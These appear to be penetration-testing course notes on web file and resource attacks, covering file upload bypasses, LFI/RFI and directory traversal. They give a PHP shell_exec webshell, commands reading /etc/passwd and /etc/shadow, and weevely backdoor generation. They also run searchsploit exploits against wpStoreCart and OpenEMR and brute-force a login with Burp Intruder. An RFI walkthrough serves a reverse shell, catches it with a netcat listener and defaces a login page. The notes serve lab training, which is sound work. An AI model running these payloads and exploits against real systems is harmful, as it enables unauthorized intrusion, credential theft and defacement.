## 7. FILE AND RESOURCE ATTACKS

### 7.1. Basic file upload vulnerabilities

- **Actions**:
  1. Upload the file and check the url with the folders → Go to gobuster
  2. Gobuster command → ```dir --url [url] (without path) --wordlist usr/share/wordlists/dirb/common.txt```
  3. Check if it allows directory listing by accessing the url
  4. Check file extensions in Burp Suite → add a php payload → save on desktop
    ```php
        $output = shell_exec($_GET["cmd"]);
        echo "<pre>$output</pre>";
    ```
  5. Upload the file
  6. Cmd will contain the command for the injection
    - Examples
        - ```id```
        - ```whoami```
        - ```ls /var/www/html```
        - ```cat /etc/passwd```
        - ```cat /etc/shadow```
        - ```cat /etc/*release```
  7. Reverse shells
    - Webshells: ```cd /usr/share/webshells/php``` 
    - Change IP in target folder

### 7.2. Bypassing file upload extension filters

1. Intercept POST upload with BS. Check body payload
2. Change content type to one allowed → MIME type, ```image/jpeg```
3. If not working → change the filename extension
4. Then execute the access get url but in the context of php → ```url/shell.jpg/shell.php?cmd=id```
5. Repeat steps from lab 1
5. Do it automatically
  - Generate payload → ```weevely generate password ~/Desktop/weevely.jpg```
  - Attack against the url → ```weevely url password```

### 7.3. Bypassing PHPx Blacklists

1. Upload allowed (configuration in php can state which version of php is executed) → result is file is interpreted as plain text
2. Use BS → send to repeater, change the name, check response
3. In the headers → server is revealed, not php version
4. Then, change php extension to this → php7
5. When executing → code is executed now

### 7.4. WordPress wpStoreCart File Upload 

1. Start with an enumeration → copy the url 
  - ```wpscan --url url``` 
2. Check theme, version, plugins and upload directory listing → check url
3. Search for exploits → ```searchsploit wpstorecart```
4. Check the exploit
  - Copy the file → ```cp /usr/share/exploitdb/exploits/phpwebapps/19023.php .```
  - Inspect content → ```vim 19023.php```
5. Copy the new url with the one from the lab → complete url from the result of searchsploit
6. Copy the php payload → exploit.php
7. Modify the name to match yours → full absolute path
8. Give permissions to the file → ```chmod +x exploit.php```
9. Install php → ```apt-get install php```
10. Execute with → ```php -f exploit.php```
11. Change script to be → ```curl_file_create(filename)``` instead of @name
12. Execute the commands with the injection
13. Using weevely → password generation allows to protect the file
  - Command → ```weevely generate password ~/Desktop/login.php```
  - Change the payload previous script with the new file generated (exploit.php, in the variable @uploadfile)
  - Execute the script → ```php -f exploit.php``. This uploads login.php to the uploads folder in the application
  - Copy the url when accessing
  - Use it with weevely → ```weevely url password```
  - Then you obtain the session
14. Automate with curl → ```curl -F "Filedata=@./pathtofile.php" url```

### 7.5. OpenEMR directory traversal

1. Use wappalyzer in order to know the web stack is being used
2. Directory brute force on the url → ```gobuster dir --url [url] --wordlist /usr/share/wordlists/dirb/common.txt -t 20```. (T are the threads)
  - Check the directories shown in the result
    - Build
    - Common
    - Config
    - Library
    - sql
3. Apply brute force in the login page with the intruder in BS
  - Put pass as the variable
  - Use sniper mode
  - Load the metasploit wordlist, unit_passwords.txt
  - Identify the one with a different length and redirection
4. After checking the OpenEMR version, use searchsploit → ```searchsploit openemr```
5. Copy the one you are using (Authenticated) Arbitrary File Actions
  - ```/usr/share/exploitdb/exploits/linux/webapps/45202.txt .```
6. Follow the instructions → pass the parameters and abuse the one that is being printed. Use Burp Suite
7. Remove content length header. Place the directory traversal in the parameter
8.  You can directly type the path → ```/etc/passwd```
  - Check also directory traversal works → ```../../../../../../etc/passwd```
  - Check resources → ```/var/www/html/sites/default/sqlconf.php```

### 7.6. LFI basics

1. You should be able to go with files located directly in /var/www/html (because it's where files are server) or with directory traversal → ```/var/www/html/phpinfo.php``` or ```../../../../../var/www/html/phpinfo.php```

### 7.7. WordPress IMDb Widget LFI

1. First, perform a scan  → ```wpscan --url url```
2. Execute searchsploit to browse information → ```searchsploit imdb```
3. Copy the file from the path column to the desktop → ```/usr/share/exploitdb/exploits/php/webapps/39621.txt ./39621.txt```
  - Then read it with cat. In the vuln part you have the vulnerable code
  - Then the PoC shows the directory traversal towards the file that is included
4. Below, you can find next step → right click, save and change the extension to php
  - The php code is not executed in the inclusion, as it's being read as an image
5. Execute → ```wget + full url with LFI -O output.txt```
  - It's just another way to get the content (apart from changing the extension to the downloaded image)
  - The content shows sensitive information, such as usernames and credentials

### 7.8. RFI inclusion basics

1. Check the ip with → ```ifconfig```
2. Navigate → OWASP 2017/Broken access control/Insecure direct object references/RFI
  - The url will show an external resource
3. Kali Linux prepackaged with reverse shells in the webshells directory → ```ls -la /usr/share/webshells/php/```
4. Copy the php reverse shell → ```cp /usr/share/webshells/php/php-reverse-shell.php .```
5. Rename it 
6. Edit it → ```vim shell.php```
7. In the ip parameter → ```ip of current system```
  - Write and save
8. You need 2 things now → a web server to host the php and a netcat listener
  - Web server → ```python -m SimpleHTTPServer 80``` (start it in the same directory as shell.php)
  - Configure the netcat listener in another tab → ```nc -nlvp 1234```
9. Go to the url parameter and inject the RFI → ```http://x.x.x.x:1234/shell.php```
  - In the netcat tab you will have the reverse shell
10. To prove you are in the victim's server
  - Execute → ```/bin/bash -i``` to spawn a bash session
  - Cat the current system release → ```cat /etc/*release```
  - CD to the web server files directory → ```cd /var/www/html```
  - Inject html into the login.php page → ```echo "<h1>Surprise!</h1>" >> login.php```



